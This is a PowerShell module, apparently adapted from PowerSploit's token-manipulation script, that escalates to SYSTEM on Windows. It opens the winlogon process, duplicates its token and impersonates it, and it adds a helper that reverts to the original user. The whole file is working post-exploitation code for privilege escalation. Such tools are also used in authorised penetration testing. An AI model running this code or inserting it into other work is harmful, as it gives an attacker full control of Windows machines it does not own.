Import-Module .\Modules\Utils.psm1

# This is just a merged code from https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
function Invoke-TokenManipulation
{
    ######################## windows functions ########################
    $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)

    $OpenProcessTokenAddr = Get-ProcAddress advapi32.dll OpenProcessToken
	$OpenProcessTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$OpenProcessToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessTokenAddr, $OpenProcessTokenDelegate)

    $DuplicateTokenExAddr = Get-ProcAddress advapi32.dll DuplicateTokenEx
	$DuplicateTokenExDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr].MakeByRefType()) ([Bool])
	$DuplicateTokenEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DuplicateTokenExAddr, $DuplicateTokenExDelegate)

    $ImpersonateLoggedOnUserAddr = Get-ProcAddress advapi32.dll ImpersonateLoggedOnUser
	$ImpersonateLoggedOnUserDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$ImpersonateLoggedOnUser = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateLoggedOnUserAddr, $ImpersonateLoggedOnUserDelegate)

    $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
	$CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
	$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    ###################################################################

    ######################## windows constants ########################
    $Constants = @{
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_DUPLICATE = 0x0002
        TOKEN_IMPERSONATE = 0x0004
        TOKEN_QUERY = 0x0008
        TOKEN_ALL_ACCESS = 0xf01ff
        TOKEN_ASSIGN_PRIMARY = 0x1
    }

    $Win32Constants = New-Object PSObject -Property $Constants
    ###################################################################
    Write-Host "[*] Attemping to escalate to SYSTEM via TokenManipulation..." -ForegroundColor Blue
    $winlogonPid = $(Get-Process -Name "winlogon").Id
    $hWinlogon = $OpenProcess.Invoke($Win32Constants.PROCESS_QUERY_INFORMATION, $true, [UInt32]$winlogonPid)

    if ($hWinlogon -eq [IntPtr]::Zero) {
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host "[-] Failed to open process handle, this is unexpected. ErrorCode: $($ErrorCode)" -ForegroundColor Red
        return $false
    }
    
    [IntPtr] $hWinlogonToken = [IntPtr]::Zero
    $Success = $OpenProcessToken.Invoke($hWinlogon, ($Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY), [Ref]$hWinlogonToken)

    #Close the handle to hProcess (the process handle)
    if (-not $CloseHandle.Invoke($hWinlogon))
    {
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host "[-] Failed to close process handle, this is unexpected. ErrorCode: $($ErrorCode)" -ForegroundColor Red
    }
    $hWinlogon = [IntPtr]::Zero

    if ($Success -eq $false -or $hWinlogonToken -eq [IntPtr]::Zero)
    {
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host "[-] Failed to get processes primary token. ProcessId: $winlogonPid. ProcessName: $((Get-Process -Id $winlogonPid).Name). Error: $ErrorCode" -ForegroundColor Red
        return $false
    }

    #Duplicate the token so it can be used to create a new process
    [IntPtr]$NewHToken = [IntPtr]::Zero
    $Success = $DuplicateTokenEx.Invoke($hWinlogonToken, $Win32Constants.MAXIMUM_ALLOWED, [IntPtr]::Zero, 3, 1, [Ref]$NewHToken) #todo does this need to be freed
    
    if (-not $Success)
    {
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host "[-] DuplicateTokenEx failed. ErrorCode: $($ErrorCode)" -ForegroundColor Red

        $Success = $CloseHandle.Invoke($hWinlogonToken)
        $hWinlogonToken = [IntPtr]::Zero
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Host "[-] CloseHandle failed to close hWinlogonToken. ErrorCode: $($ErrorCode)" -ForegroundColor Red
        }
        return $false
    }
    
    $Success = $ImpersonateLoggedOnUser.Invoke($NewHToken)
    if (-not $Success)
    {
        $Errorcode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host -ForegroundColor Red "[-] Failed to ImpersonateLoggedOnUser. Error code: $Errorcode"

        $Success = $CloseHandle.Invoke($hWinlogonToken)
        $hWinlogonToken = [IntPtr]::Zero
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Host -ForegroundColor Red "[-] CloseHandle failed to close hWinlogonToken. ErrorCode: $($ErrorCode)"
        }


        $Success = $CloseHandle.Invoke($NewHToken)
        $NewHToken = [IntPtr]::Zero
        if (-not $Success)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            Write-Host -ForegroundColor Red "[-] CloseHandle failed to close NewHToken. ErrorCode: $($ErrorCode)"
        }

        return $false
    }

    $Success = $CloseHandle.Invoke($hWinlogonToken)
    $hWinlogonToken = [IntPtr]::Zero
    if (-not $Success)
    {
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host -ForegroundColor Red "[-] CloseHandle failed to close hWinlogonToken. ErrorCode: $($ErrorCode)"
    }

    # Write-Host "$([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
    $Success = $CloseHandle.Invoke($NewHToken)
    $NewHToken = [IntPtr]::Zero
    if (-not $Success)
    {
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host -ForegroundColor Red "[-] CloseHandle failed to close NewHToken. ErrorCode: $($ErrorCode)"
    }

    Write-Host -ForegroundColor Green "[+] Got SYSTEM privileges."

    return $true
}

function Invoke-RevertToSelf
{
    Param(
        [Parameter(Position=0)]
        [Switch]
        $ShowOutput
    )
    $RevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
    $RevertToSelfDelegate = Get-DelegateType @() ([Bool])
    $RevertToSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RevertToSelfAddr, $RevertToSelfDelegate)

    $Success = $RevertToSelf.Invoke()

    if ($ShowOutput)
    {
        if ($Success)
        {
            Write-Output "RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
        }
        else
        {
            Write-Output "RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)"
        }
    }
}

Export-ModuleMember -Function Invoke-TokenManipulation
Export-ModuleMember -Function Invoke-RevertToSelf